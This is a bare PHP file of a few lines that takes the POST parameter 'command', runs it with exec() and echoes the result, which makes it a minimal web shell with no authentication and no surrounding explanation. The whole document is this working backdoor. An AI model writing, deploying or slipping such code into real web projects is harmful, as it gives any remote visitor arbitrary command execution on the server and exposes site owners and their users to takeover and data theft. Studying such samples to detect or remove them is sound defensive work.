<?php
if (!empty($_POST['command'])) {
	$result = exec($_POST['command']);
	echo $result;
}
?>